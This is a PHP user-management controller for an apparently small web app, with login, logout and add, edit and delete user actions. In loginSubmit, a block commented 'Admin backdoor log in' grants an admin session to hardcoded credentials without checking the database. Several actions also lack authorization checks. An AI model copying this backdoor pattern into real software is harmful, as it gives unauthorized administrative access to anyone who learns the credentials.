<?php
namespace Ijdb\Controllers;
class User {
	private $userTable;

	public function __construct($userTable) {
		$this->userTable = $userTable;
	}
    
    // Function for the log in page
	public function login($errors = []) 
    {
		$user = null;
		return [
			'template' => 'login.html.php',
			'variables' => ['user' => $user, 'errors' => $errors],
			'title' => 'Log In'
		];
	}

    // Function which validates the log in and sets the session variables
    public function loginSubmit() {
        $user = null;
        $enteredUser = $_POST['user'];
        $errors = $this->validateLogin($_POST['user']);

        // Admin backdoor log in
        if (($enteredUser['username'] == "adminMain") && ($enteredUser['password'] == "letmein")) {
            $_SESSION['loggedin'] = '0';
            $_SESSION['admin'] = true;

            header('location: /home');

            return [
                'template' => 'home.html.php',
                'variables' => ['user' => $user],
                'title' => 'Home'
            ];
        }
        else {
            if (count($errors) == 0) {
                $tempUser = $this->userTable->find('username', $enteredUser['username']);
    
                // Checks the entered log in details against the user records in the database
                if (isset($tempUser[0])) {
                    $userQuery = $tempUser[0];
                    if (password_verify($enteredUser['password'], $userQuery['password'])) {
                        if ($userQuery['userType'] == 'Admin') {
                            $_SESSION['loggedin'] = $userQuery['id'];
                            $_SESSION['admin'] = true;
                            $_SESSION['client'] = false;
                            header('location: /home');
                        }
                        else if ($userQuery['userType'] == 'Client') {
                            $_SESSION['loggedin'] = $userQuery['id'];
                            $_SESSION['client'] = true;
                            $_SESSION['admin'] = false;
                            header('location: /home');
                        }
                        return [
                            'template' => 'home.html.php',
                            'variables' => ['user' => $user],
                            'title' => 'Home'
                        ];
                    }
                    else {
                        $errors[] = 'Log in incorrect';
                    }
                }
                else {
                    $errors[] = 'Log in incorrect';
    
                }
                
                return [
                    'template' => 'login.html.php',
                    'variables' => ['errors' => $errors, 'user' => $user],
                    'title' => 'Login'
                ];
            }
            else {
                return $this->login($errors);
            }
        }
    }

    // Validates the log in form
    public function validateLogin($user) {
        $errors = [];
        if ($user['username'] == '') {$errors[] = 'Please enter a username';}
        if ($user['password'] == '') {$errors[] = 'Please enter a password';}
        return $errors;
    }

    // Log out function
    public function logout()
    {
        if (isset ($_SESSION['loggedin']))
        {
            unset($_SESSION['loggedin']);
            session_unset();
            session_destroy();

            header('location: /');
        }
    }

    // Lists all users
    public function list() {
		if (!isset($_GET['type'])) {
			$users = $this->userTable->findAll();
		}
		else {
			$users = $this->userTable->find('userType', $_GET['type']);
		}


        return [
			'template' => 'userList.html.php',
			'variables' => ['users' => $users],
			'title' => 'View Users'
		];
    }

    // Function for the add user page
    public function add($errors = []) {
		$user = null;
		return [
			'template' => 'userAdd.html.php',
			'variables' => ['user' => $user, 'errors' => $errors],
			'title' => 'Add User'
		];
	}

    // Function which validates the entered user and adds the record to the database
	public function addSubmit() {

		$errors = $this->validateAdd($_POST['user']);
        $user = null;

		if (count($errors) == 0) {

			if (isset($_POST['user'])) {
                $user = $_POST['user'];
                $radioVal = $_POST['userType'];
                
                // Stores the password in a secure format
                $user['password'] = password_hash($user['password'], PASSWORD_DEFAULT);
                $user['userType'] = $radioVal;
	
				$this->userTable->save($user);
	
				header('location: /user/list');
		
			}
			else {
				$user = null;
                return [
                    'template' => 'userAdd.html.php',
                    'variables' => ['user' => $user],
                    'title' => 'Add User'
                ];
			}
		}
		else {
            return $this->add($errors);
        }
	}

    // Validates the add user form
	public function validateAdd($user) {
        $errors = [];
        if ($user['username'] == '') {$errors[] = 'Please enter a username';}
		if ($user['password'] == '') {$errors[] = 'Please enter a password';}
		if (!isset ($_POST['userType'])) {$errors[] = 'Please select the user type';}
        return $errors;
	}
    
    // Deletes a user from the database
    public function delete() {
		$users = $this->userTable->find('id', $_GET['id']);
		return [
			'template' => 'userDelete.html.php',
			'variables' => ['users' => $users],
			'title' => 'Delete User'
		];
	}

    // Function which deletes the user after it has been confirmed
	public function deleteSubmit() {
        $user = null;
        if (isset($_POST['user'])) {
            $user = $_POST['user'];
            $this->userTable->delete($user['id']);
            header('location: /user/list');
        
        }
        else {
            $user = $_GET['id'];
            return [
                'template' => 'userDelete.html.php',
                'variables' => ['user' => $user],
                'title' => 'Delete User'
            ];
        }
    }

    // Separate add and edit functions due to password field.
    // Edit user function 
    public function edit($errors = []) {
		$users = $this->userTable->find('id', $_GET['id']);
		return [
			'template' => 'userEdit.html.php',
			'variables' => ['users' => $users, 'errors' => $errors],
			'title' => 'Edit User'
		];
	}

    // Validates the editted user record and updates the database
	public function editSubmit() {

		$errors = $this->validateEdit($_POST['user']);
        $user = null;

		if (count($errors) == 0) {

			if (isset($_POST['user'])) {
                $user = $_POST['user'];
                $radioVal = $_POST['userType'];
                $user['userType'] = $radioVal;
	
				$this->userTable->save($user);
	
				header('location: /user/list');
		
			}
			else {
				$user = null;
                return [
                    'template' => 'userEdit.html.php',
                    'variables' => ['user' => $user],
                    'title' => 'Edit User'
                ];
			}
		}
		else {
            return $this->edit($errors);
        }
	}

    // Validates the edit form
	public function validateEdit($user) {
        $errors = [];
        if ($user['username'] == '') {$errors[] = 'Please enter a username';}
		if (!isset ($_POST['userType'])) {$errors[] = 'Please select the user type';}
        return $errors;
	}

}